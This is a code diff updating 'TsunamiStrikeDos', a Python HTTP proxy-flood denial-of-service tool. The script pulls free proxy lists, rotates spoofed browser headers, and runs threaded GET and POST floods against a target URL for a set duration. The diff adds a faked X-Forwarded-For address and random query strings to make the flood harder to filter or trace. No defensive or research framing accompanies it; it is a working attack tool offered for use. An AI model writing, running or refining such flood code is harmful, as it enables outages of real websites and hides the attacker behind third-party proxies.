@@ -16,28 +16,28 @@ from halo import Halo
 
 os.system('clear')
 
-version = "5.1"
+version = "5.2"
 method = "HTTP PROXY"
 
 sip = Halo()
 print(f'''
 {F.WHITE} TSD TOOL {F.GREEN} |{F.WHITE} HTTP PROXY FLOOD {F.GREEN} |{F.WHITE} BY ALM7MDY
-{F.GREEN}
-▄▄▄█████▓  ██████ ▓█████▄ 
-▓  ██▒ ▓▒▒██    ▒ ▒██▀ ██▌
-▒ ▓██░ ▒░░ ▓██▄   ░██   █▌
-░ ▓██▓ ░   ▒   ██▒░▓█▄   ▌
-  ▒██▒ ░ ▒██████▒▒░▒████▓ 
-  ▒ ░░   ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ 
-    ░    ░ ░▒  ░ ░ ░ ▒  ▒ 
-  ░      ░  ░  ░   ░ ░  ░ 
-               ░     ░    
-                   ░      
+        {F.GREEN}
+        ▄▄▄█████▓  ██████ ▓█████▄ 
+        ▓  ██▒ ▓▒▒██    ▒ ▒██▀ ██▌
+        ▒ ▓██░ ▒░░ ▓██▄   ░██   █▌
+        ░ ▓██▓ ░   ▒   ██▒░▓█▄   ▌
+        ▒██▒ ░ ▒██████▒▒░▒████▓ 
+        ▒ ░░   ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ 
+            ░    ░ ░▒  ░ ░ ░ ▒  ▒ 
+        ░      ░  ░  ░   ░ ░  ░ 
+                    ░     ░    
+                        ░      
 
                 {F.CYAN} TsunamiStrikeDos V{F.GREEN} {version}{F.RESET}
 
 ''')
-print('_'*40)
+print('_'*60)
 
 fake = faker.Faker()
 
@@ -47,7 +47,7 @@ def get_http_proxies() -> List[Dict[str, str]]:
     proxies = []
     try:
         with requests.get(
-            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=88170",
+            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=88270",
             verify=False,
         ) as proxy_list_http:
             proxies_http = [
@@ -58,7 +58,7 @@ def get_http_proxies() -> List[Dict[str, str]]:
             proxies.extend(proxies_http)
 
         with requests.get(
-            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=ipport&format=text&timeout=50630",
+            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=ipport&format=text&timeout=88270",
             verify=False,
         ) as proxy_list_socks4:
             proxies_socks4 = [
@@ -99,6 +99,19 @@ def generate_headers():
         "Sec-Fetch-Site": "same-origin",
         "Sec-Fetch-User": "?1",
         "Sec-Fetch-Dest": "document",
+        "X-Forwarded-For": fake.ipv4(),
+    }
+
+def buildBlock(size):
+
+    block = ''.join(random.choice(string.ascii_letters) for _ in range(size))
+    return block
+
+
+def generateRandData():
+
+    return {
+        "q": buildBlock(size=random.randint(10,20))+buildBlock(size=random.randint(10,20)),
     }
 
 def flood(target: str) -> None:
@@ -109,21 +122,22 @@ def flood(target: str) -> None:
         "POST"
     ])
 
+    headers = generate_headers()
+    paramsGet = generateRandData()
     while True:
-        headers = generate_headers()
+        
         try:
             proxy = random.choice(proxies)
 
             if type_request == "GET":
-                response = requests.get(target, headers=headers, proxies=proxy, timeout=5)
+                response = requests.get(target, headers=headers, params=paramsGet ,proxies=proxy, timeout=5)
             else:
                 response = requests.post(target, headers=headers, proxies=proxy, timeout=5)
             status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
             payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
             request_info = f"{F.CYAN}{type_request}{F.RESET}"
-            print(f"{status}: {request_info} Successful Attack! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
-        
+            print(f"{status}:{request_info} Successful Attack! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
         except (Timeout, OSError):
             continue
 
@@ -143,7 +157,7 @@ def start_flooding(target: str, thread_count: int, duration: int) -> None:
     while time.time() < stop_time:
         time.sleep(1)
 
-    print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {duration} seconds.{F.RESET}")
+    print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")
 
 if __name__ == "__main__":
 
@@ -164,3 +178,4 @@ if __name__ == "__main__":
     time.sleep(3)
     sipp.stop()
     start_flooding(target_url, num_threads, duration)
+
